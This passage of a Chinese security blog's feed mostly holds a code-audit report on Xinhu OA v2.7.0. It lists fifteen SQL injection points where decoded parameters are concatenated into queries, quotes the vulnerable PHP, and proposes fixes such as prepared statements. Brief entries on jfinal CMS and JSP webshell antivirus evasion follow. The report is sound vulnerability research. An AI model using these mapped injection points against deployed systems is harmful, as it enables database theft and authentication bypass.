class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getwobaAction</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$fenlei</span> = <span class="variable language_">$this</span>-&gt;jm-&gt;<span class="title function_ invoke__">base64decode</span>(<span class="variable">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;fenlei&#x27;</span>));  <span class="comment">// ⚠️ 解密</span></span><br><span class="line">    <span class="variable">$where</span>  = <span class="title function_ invoke__">m</span>(<span class="string">&#x27;admin&#x27;</span>)-&gt;<span class="title function_ invoke__">getjoinstr</span>(<span class="string">&#x27;a.`receid`&#x27;</span>, <span class="variable">$this</span>-&gt;adminid, <span class="number">1</span>);</span><br><span class="line">    <span class="comment">// ... 然后拼接到SQL</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="【10】uploadAction-php-getfileAction-Keyword过滤注入-⭐⭐⭐⭐"><a href="#【10】uploadAction-php-getfileAction-Keyword过滤注入-⭐⭐⭐⭐" class="headerlink" title="【10】uploadAction.php - getfileAction() - Keyword过滤注入 ⭐⭐⭐⭐"></a>【10】uploadAction.php - getfileAction() - Keyword过滤注入 ⭐⭐⭐⭐</h3><p><strong>文件</strong>: <code>/webmain/task/api/uploadAction.php:621</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$key</span> = <span class="variable language_">$this</span>-&gt;rock-&gt;<span class="title function_ invoke__">xssrepstr</span>(<span class="variable">$this</span>-&gt;jm-&gt;<span class="title function_ invoke__">base64decode</span>(<span class="variable">$key</span>));  <span class="comment">// ⚠️ 只有xssrepstr，没有SQL过滤</span></span><br><span class="line"><span class="variable">$where</span>.=<span class="string">&quot; and `filename` like &#x27;%&quot;</span>.<span class="variable">$key</span>.<span class="string">&quot;%&#x27;&quot;</span>;  <span class="comment">// ⚠️ 直接拼接</span></span><br></pre></td></tr></table></figure><hr><h3 id="【11-13】upgradeAction-php-三个极危SQL直接执行漏洞-⭐⭐⭐⭐⭐"><a href="#【11-13】upgradeAction-php-三个极危SQL直接执行漏洞-⭐⭐⭐⭐⭐" class="headerlink" title="【11-13】upgradeAction.php - 三个极危SQL直接执行漏洞 ⭐⭐⭐⭐⭐"></a>【11-13】upgradeAction.php - 三个极危SQL直接执行漏洞 ⭐⭐⭐⭐⭐</h3><h4 id="11-shengjianssAjax-SQL语句直接执行"><a href="#11-shengjianssAjax-SQL语句直接执行" class="headerlink" title="11. shengjianssAjax() - SQL语句直接执行"></a>11. shengjianssAjax() - SQL语句直接执行</h4><p><strong>文件</strong>: <code>/webmain/system/upgrade/upgradeAction.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$fcont</span> = <span class="variable language_">$this</span>-&gt;jm-&gt;<span class="title function_ invoke__">base64decode</span>(<span class="variable">$data</span>[<span class="string">&#x27;content&#x27;</span>]);  <span class="comment">// ⚠️ 解密</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$type</span>==<span class="number">10</span>)&#123;</span><br><span class="line">    <span class="variable">$sqarr</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;ROCKSPLIT&#x27;</span>, <span class="variable">$fcont</span>);</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$sqarr</span> <span class="keyword">as</span> <span class="variable">$_sql1</span>)<span class="keyword">if</span>(<span class="variable">$_sql1</span>)&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$_sql1</span>,<span class="literal">false</span>);  <span class="comment">// ⚠️ 直接执行</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="12-shengjifile"><a href="#12-shengjifile" class="headerlink" title="12. shengjifile()"></a>12. shengjifile()</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$fcont</span> = <span class="variable language_">$this</span>-&gt;jm-&gt;<span class="title function_ invoke__">base64decode</span>(<span class="variable">$barr</span>[<span class="string">&#x27;data&#x27;</span>]);  <span class="comment">// ⚠️ 解密</span></span><br><span class="line"><span class="variable">$bmsg</span> = <span class="title function_ invoke__">m</span>(<span class="string">&#x27;beifen&#x27;</span>)-&gt;<span class="title function_ invoke__">updatefabric</span>(<span class="variable">$fcont</span>);  <span class="comment">// ⚠️ 直接传入</span></span><br></pre></td></tr></table></figure><h4 id="13-newinstallinfoAjax"><a href="#13-newinstallinfoAjax" class="headerlink" title="13. newinstallinfoAjax()"></a>13. newinstallinfoAjax()</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$nwsp</span> = <span class="variable language_">$this</span>-&gt;jm-&gt;<span class="title function_ invoke__">base64decode</span>(<span class="variable">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;path&#x27;</span>));  <span class="comment">// ⚠️ 解密</span></span><br><span class="line"><span class="comment">// ... 读取文件</span></span><br><span class="line"><span class="variable">$bmsg</span> = <span class="title function_ invoke__">m</span>(<span class="string">&#x27;beifen&#x27;</span>)-&gt;<span class="title function_ invoke__">updatefabric</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$mysqlpath</span>), <span class="number">1</span>);  <span class="comment">// ⚠️ 执行</span></span><br></pre></td></tr></table></figure><hr><h3 id="【14】whereModel-php-getstrwhere-WHERE子句注入-⭐⭐⭐⭐"><a href="#【14】whereModel-php-getstrwhere-WHERE子句注入-⭐⭐⭐⭐" class="headerlink" title="【14】whereModel.php - getstrwhere() - WHERE子句注入 ⭐⭐⭐⭐"></a>【14】whereModel.php - getstrwhere() - WHERE子句注入 ⭐⭐⭐⭐</h3><p><strong>文件</strong>: <code>/webmain/model/whereModel.php:231</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getstrwhere</span>(<span class="params"><span class="variable">$str</span>, <span class="variable">$uid</span>=<span class="string">&#x27;&#x27;</span>, <span class="variable">$fid</span>=<span class="string">&#x27;&#x27;</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$where</span> = <span class="variable language_">$this</span>-&gt;rock-&gt;jm-&gt;<span class="title function_ invoke__">base64decode</span>(<span class="variable">$str</span>);  <span class="comment">// ⚠️ 解密</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$where</span>==<span class="string">&#x27;all&#x27;</span> || <span class="title function_ invoke__">contain</span>(<span class="variable">$where</span>, <span class="string">&#x27;&#123;super&#125;&#x27;</span>) || </span><br><span class="line">        <span class="title function_ invoke__">contain</span>(<span class="variable">$where</span>, <span class="string">&#x27;&#123;allsuper&#125;&#x27;</span>) || </span><br><span class="line">        <span class="title function_ invoke__">contain</span>(<span class="variable">$where</span>, <span class="string">&#x27;&#123;company&#125;&#x27;</span>))<span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="comment">// ... 然后直接用于SQL</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>配合使用的地方</strong>（flowModel.php:152）:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$wheresstr</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getstrwhere</span>(<span class="variable">$this</span>-&gt;rock-&gt;jm-&gt;<span class="title function_ invoke__">base64decode</span>(<span class="variable">$rs</span>[<span class="string">&#x27;wheresstr&#x27;</span>]), <span class="variable">$uid</span>, <span class="variable">$fid</span>);</span><br><span class="line"><span class="comment">// ... 直接拼接到SQL</span></span><br></pre></td></tr></table></figure><hr><h3 id="【15】webmainAction-php-limitRows-WHERE-KEYWHERE注入-⭐⭐⭐⭐⭐"><a href="#【15】webmainAction-php-limitRows-WHERE-KEYWHERE注入-⭐⭐⭐⭐⭐" class="headerlink" title="【15】webmainAction.php - limitRows() - WHERE&#x2F;KEYWHERE注入 ⭐⭐⭐⭐⭐"></a>【15】webmainAction.php - limitRows() - WHERE&#x2F;KEYWHERE注入 ⭐⭐⭐⭐⭐</h3><p><strong>文件</strong>: <code>/webmain/webmainAction.php:120</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">limitRows</span>(<span class="params"><span class="variable">$table</span>,<span class="variable">$fields</span>=<span class="string">&#x27;*&#x27;</span>,<span class="variable">$wherea</span>=<span class="string">&#x27;1=1&#x27;</span>,<span class="variable">$order</span>=<span class="string">&#x27;&#x27;</span>,<span class="variable">$arr</span>=<span class="keyword">array</span>(<span class="params"></span>)</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$where</span>    = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">request</span>(<span class="string">&#x27;where&#x27;</span>);</span><br><span class="line">    <span class="variable">$keywhere</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">request</span>(<span class="string">&#x27;keywhere&#x27;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">isempt</span>(<span class="variable">$where</span>))&#123;</span><br><span class="line">        <span class="variable">$where</span>    = <span class="variable language_">$this</span>-&gt;jm-&gt;<span class="title function_ invoke__">uncrypt</span>(<span class="variable">$this</span>-&gt;rock-&gt;<span class="title function_ invoke__">iconvsql</span>(<span class="variable">$where</span>));  <span class="comment">// ⚠️ 先过滤加密串，再解密</span></span><br><span class="line">        <span class="variable">$where</span>    = <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">filterstr</span>(<span class="variable">$this</span>-&gt;rock-&gt;<span class="title function_ invoke__">covexec</span>(<span class="variable">$where</span>));  <span class="comment">// ⚠️ filterstr已弃用</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">isempt</span>(<span class="variable">$keywhere</span>))&#123;</span><br><span class="line">        <span class="variable">$keywhere</span> = <span class="variable language_">$this</span>-&gt;jm-&gt;<span class="title function_ invoke__">uncrypt</span>(<span class="variable">$this</span>-&gt;rock-&gt;<span class="title function_ invoke__">iconvsql</span>(<span class="variable">$keywhere</span>));  <span class="comment">// ⚠️ 过滤逻辑错误</span></span><br><span class="line">        <span class="variable">$keywhere</span> = <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">filterstr</span>(<span class="variable">$this</span>-&gt;rock-&gt;<span class="title function_ invoke__">covexec</span>(<span class="variable">$keywhere</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$wherea</span> .= <span class="string">&quot; <span class="subst">$where</span> <span class="subst">$keywhere</span>&quot;</span>;  <span class="comment">// ⚠️ 直接拼接</span></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>问题</strong>:</p><ul><li><strong>先对加密串过滤（无效）</strong></li><li><strong>再解密（恢复SQL关键字）</strong></li><li><strong>然后用已弃用的filterstr（不起作用）</strong></li></ul><hr><h2 id="📊-漏洞统计"><a href="#📊-漏洞统计" class="headerlink" title="📊 漏洞统计"></a>📊 漏洞统计</h2><table><thead><tr><th align="left">序号</th><th align="left">文件</th><th align="left">方法</th><th align="left">解密方式</th><th align="left">危害等级</th><th align="left">是否有过滤</th></tr></thead><tbody><tr><td align="left">1</td><td align="left">inputAction.php</td><td align="left">getselectdataAjax</td><td align="left">base64decode</td><td align="left">⭐⭐⭐⭐⭐⭐</td><td align="left"><strong>无</strong></td></tr><tr><td align="left">2</td><td align="left">tableAction.php</td><td align="left">savedbupurlAjax</td><td align="left">base64decode</td><td align="left">⭐⭐⭐⭐</td><td align="left"><strong>无</strong></td></tr><tr><td align="left">3</td><td align="left">loginAction.php</td><td align="left">jinxwqqtbAction</td><td align="left">base64decode</td><td align="left">⭐⭐⭐⭐⭐</td><td align="left"><strong>无</strong></td></tr><tr><td align="left">4</td><td align="left">loginAction.php</td><td align="left">yzmAction</td><td align="left">base64decode</td><td align="left">⭐⭐⭐⭐⭐</td><td align="left"><strong>无</strong></td></tr><tr><td align="left">5</td><td align="left">goodsModel.php</td><td align="left">getpage</td><td align="left">base64decode</td><td align="left">⭐⭐⭐⭐</td><td align="left"><strong>无</strong></td></tr><tr><td align="left">6</td><td align="left">crmModel.php</td><td align="left">getclientselect</td><td align="left">base64decode</td><td align="left">⭐⭐⭐⭐</td><td align="left"><strong>无</strong></td></tr><tr><td align="left">7</td><td align="left">crmModel.php</td><td align="left">getclientpage</td><td align="left">base64decode</td><td align="left">⭐⭐⭐⭐</td><td align="left"><strong>无</strong></td></tr><tr><td align="left">8</td><td align="left">loginModel.php</td><td align="left">cookie登录</td><td align="left">uncrypt</td><td align="left">⭐⭐⭐⭐</td><td align="left"><strong>无</strong></td></tr><tr><td align="left">9</td><td align="left">uploadAction.php</td><td align="left">getwobaAction</td><td align="left">base64decode</td><td align="left">⭐⭐⭐⭐</td><td align="left"><strong>无</strong></td></tr><tr><td align="left">10</td><td align="left">uploadAction.php</td><td align="left">getfileAction</td><td align="left">base64decode</td><td align="left">仅xssrepstr</td><td align="left">无SQL过滤</td></tr><tr><td align="left">11</td><td align="left">upgradeAction.php</td><td align="left">shengjianssAjax</td><td align="left">base64decode</td><td align="left">⭐⭐⭐⭐⭐</td><td align="left"><strong>无</strong></td></tr><tr><td align="left">12</td><td align="left">upgradeAction.php</td><td align="left">shengjifile</td><td align="left">base64decode</td><td align="left">⭐⭐⭐⭐⭐</td><td align="left"><strong>无</strong></td></tr><tr><td align="left">13</td><td align="left">upgradeAction.php</td><td align="left">newinstallinfoAjax</td><td align="left">base64decode</td><td align="left">⭐⭐⭐⭐⭐</td><td align="left"><strong>无</strong></td></tr><tr><td align="left">14</td><td align="left">whereModel.php</td><td align="left">getstrwhere</td><td align="left">base64decode</td><td align="left">⭐⭐⭐⭐</td><td align="left"><strong>无</strong></td></tr><tr><td align="left">15</td><td align="left">webmainAction.php</td><td align="left">limitRows</td><td align="left">uncrypt</td><td align="left">⭐⭐⭐⭐⭐</td><td align="left">过滤逻辑错误</td></tr></tbody></table><hr><h2 id="🎯-根本原因分析"><a href="#🎯-根本原因分析" class="headerlink" title="🎯 根本原因分析"></a>🎯 根本原因分析</h2><h3 id="1-错误的加密-安全的思维"><a href="#1-错误的加密-安全的思维" class="headerlink" title="1. 错误的加密&#x3D;安全的思维"></a>1. 错误的加密&#x3D;安全的思维</h3><p>开发者认为只要参数加密了就安全，<strong>忘记了解密后还需要过滤</strong></p><h3 id="2-过滤时机错误"><a href="#2-过滤时机错误" class="headerlink" title="2. 过滤时机错误"></a>2. 过滤时机错误</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 错误示例：</span></span><br><span class="line"><span class="title function_ invoke__">iconvsql</span>(<span class="variable">$encrypted_string</span>)  <span class="comment">// 过滤加密串 ← 无意义</span></span><br><span class="line">jm-&gt;<span class="title function_ invoke__">uncrypt</span>(<span class="variable">$filtered</span>)       <span class="comment">// 解密后恢复SQL关键字</span></span><br></pre></td></tr></table></figure><p><strong>正确应该是</strong>:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$plain</span> = jm-&gt;<span class="title function_ invoke__">uncrypt</span>(<span class="variable">$encrypted</span>)  <span class="comment">// 先解密</span></span><br><span class="line"><span class="variable">$safe</span>  = <span class="title function_ invoke__">iconvsql</span>(<span class="variable">$plain</span>)         <span class="comment">// 再过滤明文</span></span><br></pre></td></tr></table></figure><h3 id="3-filterstr已弃用但仍在使用"><a href="#3-filterstr已弃用但仍在使用" class="headerlink" title="3. filterstr已弃用但仍在使用"></a>3. filterstr已弃用但仍在使用</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// mysqlClass.php</span></span><br><span class="line"><span class="comment">//弃用过滤</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">filterstr</span>(<span class="params"><span class="variable">$str</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// ... 但webmainAction.php还在用</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="💡-修复建议"><a href="#💡-修复建议" class="headerlink" title="💡 修复建议"></a>💡 修复建议</h2><h3 id="1-立即修复"><a href="#1-立即修复" class="headerlink" title="1. 立即修复"></a>1. 立即修复</h3><p><strong>所有解密操作后必须过滤</strong>:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 修复模板</span></span><br><span class="line"><span class="variable">$param</span> = <span class="variable language_">$this</span>-&gt;jm-&gt;<span class="title function_ invoke__">base64decode</span>(<span class="variable">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;param&#x27;</span>));  <span class="comment">// 解密</span></span><br><span class="line"><span class="variable">$param</span> = <span class="variable language_">$this</span>-&gt;rock-&gt;<span class="title function_ invoke__">iconvsql</span>(<span class="variable">$param</span>);                  <span class="comment">// 过滤明文</span></span><br><span class="line"><span class="variable">$param</span> = <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">filterstr</span>(<span class="variable">$param</span>);                   <span class="comment">// 二次过滤</span></span><br><span class="line"><span class="comment">// 或使用预处理</span></span><br><span class="line"><span class="variable">$stmt</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;SELECT * FROM table WHERE field = ?&quot;</span>);</span><br><span class="line"><span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>([<span class="variable">$param</span>]);</span><br></pre></td></tr></table></figure><h3 id="2-使用预处理语句（PDO）"><a href="#2-使用预处理语句（PDO）" class="headerlink" title="2. 使用预处理语句（PDO）"></a>2. 使用预处理语句（PDO）</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 推荐做法</span></span><br><span class="line"><span class="variable">$stmt</span> = <span class="variable">$pdo</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;SELECT * FROM admin WHERE mobile = ?&quot;</span>);</span><br><span class="line"><span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>([<span class="variable">$shouji</span>]);</span><br></pre></td></tr></table></figure><h3 id="3-废弃自定义加密用于安全"><a href="#3-废弃自定义加密用于安全" class="headerlink" title="3. 废弃自定义加密用于安全"></a>3. 废弃自定义加密用于安全</h3><p><strong>加密不是安全控制</strong>，应该：</p><ul><li>移除所有”先过滤加密串”的逻辑</li><li>统一在解密后立即过滤</li><li>使用白名单验证</li></ul><hr><h2 id="🚨-影响范围"><a href="#🚨-影响范围" class="headerlink" title="🚨 影响范围"></a>🚨 影响范围</h2><p><strong>本系统存在 15个真正的解密参数SQL注入漏洞</strong>，其中：</p><ul><li><strong>1个万能SQL注入</strong> (可读取任意表)</li><li><strong>4个极危漏洞</strong> (可直接执行SQL或绕过登录)</li><li><strong>8个高危漏洞</strong> (可注入各种查询)</li><li><strong>1个任意配置写入</strong> (可能RCE)</li><li><strong>1个过滤逻辑错误</strong> (全局影响)</li></ul><p><strong>几乎所有需要认证的功能都可能被绕过！</strong></p><hr><h2 id="📝-备注"><a href="#📝-备注" class="headerlink" title="📝 备注"></a>📝 备注</h2><p>感谢你的指正！通过你指出的两个漏洞，我学会了识别**”解密后未过滤直接拼接”**这个致命模式，最终找到了全部15个漏洞。</p><p>这个系统的核心问题在于：</p><ol><li><strong>加密≠安全</strong> 的错误认知</li><li><strong>过滤时机错误</strong> (先过滤密文再解密)</li><li><strong>废弃的过滤函数仍在使用</strong></li></ol><hr><p>生成时间: 2025-10-09 审计工具: 人工代码审计 + grep搜索</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;【最终完整版】信呼OA-v2-7-0-解密SQL注入漏洞审计报告&quot;&gt;&lt;a href=&quot;#【最终完整版】信呼OA-v2-7-0-解密SQL注入漏洞审计报告&quot; class=&quot;headerlink&quot; title=&quot;【最终完整版】信呼OA v2.7.0 - 解密SQL注入</summary>
      
    
    
    
    <category term="WEB安全" scheme="https://250wuyifan.github.io/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="WEB安全" scheme="https://250wuyifan.github.io/tags/WEB%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>jfinal CMS代码审计</title>
    <link href="https://250wuyifan.github.io/2025/10/06/jfinal%20CMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    <id>https://250wuyifan.github.io/2025/10/06/jfinal%20CMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</id>
    <published>2025-10-06T12:24:25.000Z</published>
    <updated>2025-10-07T08:06:57.912Z</updated>
    
    <content type="html"><![CDATA[<h1 id="搭建"><a href="#搭建" class="headerlink" title="搭建"></a>搭建</h1><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251006204921827.png" alt="image-20251006204921827"></p><h1 id="有漏洞的组件"><a href="#有漏洞的组件" class="headerlink" title="有漏洞的组件"></a>有漏洞的组件</h1><h2 id="fastjson-1-2-62-极高风险"><a href="#fastjson-1-2-62-极高风险" class="headerlink" title="fastjson 1.2.62 - 极高风险"></a>fastjson 1.2.62 - 极高风险</h2><p><a href="https://www.freebuf.com/articles/web/418403.html">https://www.freebuf.com/articles/web/418403.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;搭建&quot;&gt;&lt;a href=&quot;#搭建&quot; class=&quot;headerlink&quot; title=&quot;搭建&quot;&gt;&lt;/a&gt;搭建&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/250wuyifan/WaiLian250/main</summary>
      
    
    
    
    <category term="java安全" scheme="https://250wuyifan.github.io/categories/java%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="java安全" scheme="https://250wuyifan.github.io/tags/java%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>初探JSP免杀</title>
    <link href="https://250wuyifan.github.io/2025/10/04/%E5%88%9D%E6%8E%A2JSP%E5%85%8D%E6%9D%80/"/>
    <id>https://250wuyifan.github.io/2025/10/04/%E5%88%9D%E6%8E%A2JSP%E5%85%8D%E6%9D%80/</id>
    <published>2025-10-04T14:58:48.000Z</published>
    <updated>2025-10-04T15:00:19.980Z</updated>
    
    
    
    
    
    <category term="免杀" scheme="https://250wuyifan.github.io/tags/%E5%85%8D%E6%9D%80/"/>
    
  </entry>
  
  <entry>
    <title>JSP工作原理和免杀</title>
    <link href="https://250wuyifan.github.io/2025/10/03/JSP%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86%E5%92%8C%E5%85%8D%E6%9D%80/"/>
    <id>https://250wuyifan.github.io/2025/10/03/JSP%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86%E5%92%8C%E5%85%8D%E6%9D%80/</id>
    <published>2025-10-02T16:28:14.000Z</published>
    <updated>2025-10-02T16:28:14.141Z</updated>
    
    
    
    
    
  </entry>
  
</feed>
